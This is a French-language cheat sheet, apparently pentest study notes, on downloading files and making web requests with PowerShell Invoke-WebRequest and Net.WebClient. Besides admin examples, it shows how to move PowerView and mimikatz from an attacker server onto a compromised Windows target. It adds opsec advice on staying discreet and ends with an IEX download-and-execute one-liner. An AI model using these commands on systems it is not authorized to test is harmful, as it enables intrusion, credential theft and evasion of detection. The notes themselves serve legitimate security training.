# Interaction avec le Web via PowerShell

## <mark style="color:red;">Interaction avec le Web via PowerShell</mark>

### <mark style="color:blue;">🎯 Cmdlet Principal :</mark> <mark style="color:blue;"></mark><mark style="color:blue;">`Invoke-WebRequest`</mark>

#### Alias disponibles

* `wget`
* `iwr`
* `curl`

***

### <mark style="color:blue;">📥 TÉLÉCHARGER DES FICHIERS</mark>

#### <mark style="color:green;">Méthode 1 : Invoke-WebRequest (Recommandée)</mark>

```powershell
# Télécharger depuis Internet
Invoke-WebRequest -Uri "https://example.com/fichier.ps1" -OutFile "C:\fichier.ps1"

# Télécharger depuis un serveur local
Invoke-WebRequest -Uri "http://10.10.14.169:8000/tool.ps1" -OutFile "C:\tool.ps1"
```

**Syntaxe simple :**

```powershell
Invoke-WebRequest -Uri "<URL_DU_FICHIER>" -OutFile "<DESTINATION>"
```

#### Méthode 2 : Net.WebClient (Alternative)

```powershell
# Si Invoke-WebRequest est bloqué
(New-Object Net.WebClient).DownloadFile("https://example.com/fichier.zip", "fichier.zip")
```

**Syntaxe :**

```powershell
(New-Object Net.WebClient).DownloadFile("<URL_SOURCE>", "<NOM_FICHIER_LOCAL>")
```

***

### <mark style="color:blue;">🔍 REQUÊTES WEB</mark>

#### <mark style="color:green;">Requête GET Simple</mark>

```powershell
# Requête de base
Invoke-WebRequest -Uri "https://example.com" -Method GET

# Voir les propriétés disponibles
Invoke-WebRequest -Uri "https://example.com" -Method GET | Get-Member
```

#### <mark style="color:green;">Filtrer le Contenu</mark>

```powershell
# Voir seulement les images
Invoke-WebRequest -Uri "https://example.com/page.html" -Method GET | fl Images

# Voir le contenu brut
Invoke-WebRequest -Uri "https://example.com/page.html" -Method GET | fl RawContent

# Voir les liens
Invoke-WebRequest -Uri "https://example.com" -Method GET | fl Links

# Voir les formulaires
Invoke-WebRequest -Uri "https://example.com" -Method GET | fl Forms
```

***

### <mark style="color:blue;">🖥️ SERVEUR WEB PYTHON (Côté Attaquant)</mark>

#### <mark style="color:green;">Démarrer un serveur web simple</mark>

```bash
# Depuis votre machine d'attaque Linux
python3 -m http.server 8000
```

#### <mark style="color:green;">Télécharger depuis ce serveur</mark>

```powershell
# Depuis la cible Windows
Invoke-WebRequest -Uri "http://10.10.14.169:8000/PowerView.ps1" -OutFile "C:\PowerView.ps1"
```

***

### <mark style="color:green;">📊 PROPRIÉTÉS UTILES</mark>

Quand vous faites une requête web, vous pouvez accéder à :

| Propriété     | Description                      |
| ------------- | -------------------------------- |
| `Content`     | Le contenu de la page            |
| `RawContent`  | Contenu brut (avec headers HTTP) |
| `Headers`     | En-têtes HTTP                    |
| `StatusCode`  | Code de statut (200, 404, etc.)  |
| `Images`      | Liste des images                 |
| `Links`       | Liste des liens                  |
| `Forms`       | Formulaires de la page           |
| `InputFields` | Champs de saisie                 |
| `Scripts`     | Scripts de la page               |

***

### <mark style="color:blue;">💡 CAS D'USAGE PRATIQUES</mark>

#### 1. Pour les Administrateurs Système

```powershell
# Télécharger des mises à jour
Invoke-WebRequest -Uri "https://updates.company.com/patch.msi" -OutFile "C:\Temp\patch.msi"

# Automatiser l'installation d'outils
Invoke-WebRequest -Uri "https://tools.internal/app.exe" -OutFile "C:\Tools\app.exe"
```

#### 2. Pour les Pentesters

```powershell
# Télécharger PowerView pour la reconnaissance AD
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1" -OutFile "C:\PowerView.ps1"

# Télécharger depuis votre serveur d'attaque (plus discret)
Invoke-WebRequest -Uri "http://192.168.1.100:8000/mimikatz.exe" -OutFile "C:\Windows\Temp\tool.exe"
```

#### 3. Reconnaissance Web

```powershell
# Énumérer les images d'un site
Invoke-WebRequest -Uri "https://target.com" | Select-Object -ExpandProperty Images

# Extraire tous les liens
Invoke-WebRequest -Uri "https://target.com" | Select-Object -ExpandProperty Links
```

***

### <mark style="color:blue;">⚡ EXEMPLES RAPIDES</mark>

#### Téléchargement express

```powershell
# Version courte avec alias
iwr "https://example.com/file.zip" -OutFile "file.zip"

# Version ultra-courte
iwr https://example.com/file.zip -O file.zip
```

#### Vérifier si un site répond

```powershell
$response = Invoke-WebRequest -Uri "https://example.com"
$response.StatusCode  # Devrait retourner 200 si OK
```

#### Télécharger plusieurs fichiers

```powershell
$files = @(
    "https://example.com/file1.txt",
    "https://example.com/file2.txt",
    "https://example.com/file3.txt"
)

foreach ($file in $files) {
    $filename = Split-Path $file -Leaf
    Invoke-WebRequest -Uri $file -OutFile "C:\Downloads\$filename"
}
```

***

### 🔐 AVEC AUTHENTIFICATION

```powershell
# Créer des credentials
$cred = Get-Credential

# Utiliser avec Invoke-WebRequest
Invoke-WebRequest -Uri "https://secure.example.com/file.zip" -Credential $cred -OutFile "file.zip"
```

***

### <mark style="color:blue;">⚠️ POINTS IMPORTANTS</mark>

#### ✅ Avantages

* Simple et intégré à Windows
* Pas besoin d'outils externes
* Fonctionne à distance via WinRM/SSH
* Peut parser HTML automatiquement

#### ⚠️ Limitations

* **Génère des logs** (traces réseau)
* **Détectable** par les outils de sécurité
* Nécessite connectivité Internet (sauf serveur local)

#### 🛡️ Opsec (Pour Pentesters)

* **Plus discret** : Serveur local → pas de requêtes Internet
* **Plus bruyant** : Téléchargements depuis Internet
* **Logs générés** :
  * Logs réseau (firewall, proxy)
  * Logs Windows Event
  * Logs antivirus (si fichier scanné)

***

### <mark style="color:blue;">🎓 WORKFLOW TYPIQUE (Pentest)</mark>

```
1. Sur votre machine d'attaque (Kali/Parrot)
   └─> python3 -m http.server 8000

2. Sur la cible Windows compromise
   └─> Invoke-WebRequest -Uri "http://VOTRE_IP:8000/tool.ps1" -OutFile "C:\Temp\tool.ps1"

3. Exécuter l'outil
   └─> Import-Module C:\Temp\tool.ps1
   └─> Get-Command -Module <NomDuModule>
```

***

### <mark style="color:blue;">📚 RESSOURCES COMPLÉMENTAIRES</mark>

#### Aide PowerShell

```powershell
Get-Help Invoke-WebRequest -Full
Get-Help Invoke-WebRequest -Examples
```

#### Modules associés

* **File Transfers** (module HTB) pour méthodes avancées
* **Invoke-RestMethod** pour APIs REST
* **Start-BitsTransfer** pour transferts en arrière-plan

***

### <mark style="color:blue;">🚀 COMMANDES À RETENIR</mark>

```powershell
# Les 3 commandes essentielles

# 1. Télécharger un fichier
Invoke-WebRequest -Uri "URL" -OutFile "fichier"

# 2. Faire une requête GET et analyser
Invoke-WebRequest -Uri "URL" -Method GET | Get-Member

# 3. Alternative si IWR bloqué
(New-Object Net.WebClient).DownloadFile("URL", "fichier")
```

***

**💡 Astuce Pro** : Combinez avec `Invoke-Expression` pour exécuter du code directement depuis le web (attention, dangereux !) :

```powershell
IEX (New-Object Net.WebClient).DownloadString("http://server/script.ps1")
```

**⚠️ ATTENTION** : Cette méthode est très détectée par les antivirus !
